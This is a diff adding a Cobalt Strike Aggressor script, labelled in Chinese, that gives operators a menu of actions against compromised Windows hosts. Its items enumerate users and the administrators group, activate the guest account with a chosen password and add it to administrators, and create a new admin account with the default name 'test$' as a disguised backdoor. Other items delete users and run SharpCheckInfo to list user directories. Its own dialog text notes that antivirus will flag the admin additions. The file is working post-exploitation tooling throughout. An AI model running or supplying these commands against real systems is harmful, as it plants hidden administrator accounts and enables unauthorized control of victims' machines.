@@ -1,0 +1,70 @@
+menu "用户相关" {
+	item "查询当前用户" {
+		blog($1, "-------------------------------------------------------------查询当前用户-------------------------------------------------------------");
+		bshell($1, "whoami");
+	}
+	item "查询当前在线用户" {
+		blog($1, "-------------------------------------------------------------查询当前在线用户-------------------------------------------------------------");
+		bshell($1, "query user");	}
+	item "查询管理员组" {
+		blog($1, "-------------------------------------------------------------查询管理员组-------------------------------------------------------------");
+		bshell($1, "net localgroup administrators");
+	}
+	item "查询所有组" {
+		blog($1, "-------------------------------------------------------------查询所有组-------------------------------------------------------------");
+		bshell($1, "net localgroup");
+	}	
+	item "激活guest用户" {
+		$bid = $1['@'];
+		$dialog = dialog("激活guest用户", %(password => "P@ssw0rd123",bid => $bid), &net_guest);
+		dialog_description($dialog, "此功能将激活guest用户，为其修改指定的密码，并加入管理员组中(加入管理员组中时如有杀毒软件会报毒)。该功能的运行需要管理员权限！！");
+		drow_text($dialog, "password", "密码:  ");
+		dbutton_action($dialog, "确定");
+		dialog_show($dialog);
+	}
+	item "取消激活guest用户" {
+		blog($1, "-------------------------------------------------------------取消激活guest用户-------------------------------------------------------------");
+		bshell($1, "net user guest /active:no");
+	}
+	sub net_guest {
+		blog($bid, "-------------------------------------------------------------激活guest用户-------------------------------------------------------------");
+		bshell($bid, "net user guest /active:yes");
+		bshell($bid, "net user guest $3['password']");
+		bshell($bid, "net localgroup administrators guest /add");
+		bshell($bid, "net localgroup administrators");
+		blog($bid, "guest 用户激活成功，密码为：$3['password']");
+	}
+	item "添加新用户" {
+		$bid = $1['@'];
+		$dialog = dialog("添加新用户", %(username => "test$", password => "P@ssw0rd123", bid => $bid), &add_user);
+		dialog_description($dialog, "此功能使用指定用户名密码创建新用户，并加入管理员组中(加入管理员组中时如有杀毒软件会报毒)。该功能的运行需要管理员权限！！");
+		drow_text($dialog, "username", "用户名:  ");
+		drow_text($dialog, "password", "密码:  ");
+		dbutton_action($dialog, "确定");
+		dialog_show($dialog);
+	}
+	sub add_user {
+		blog($bid, "-------------------------------------------------------------添加新用户-------------------------------------------------------------");
+		bshell($bid, "net user $3['username'] $3['password'] /add");
+		bshell($bid, "net localgroup administrators $3['username'] /add");
+		bshell($bid, "net localgroup administrators");
+		blog($bid, "用户创建成功：用户名：$3['username']  密码为：$3['password']");
+	}
+	item "删除用户" {
+		$bid = $1['@'];
+		$dialog = dialog("删除用户", %(username => "test$", bid => $bid), &del_user);
+		dialog_description($dialog, "删除用户");
+		drow_text($dialog, "username", "用户名:  ");
+		dbutton_action($dialog, "确定");
+		dialog_show($dialog);
+	}
+	sub del_user {
+		blog($bid, "-------------------------------------------------------------删除用户-------------------------------------------------------------");
+		bshell($bid, "net user $3['username'] /del");
+		blog($bid, "用户删除成功：用户名：$3['username']");
+	}
+	item "获取所有用户目录" {
+		blog($1, "-------------------------------------------------------------获取所有用户目录--------------------------------------------------------");
+		bexecute_assembly($1, script_resource('/exe/SharpCheckInfo.exe'), "-AllUserDirectories");
+	}
+}
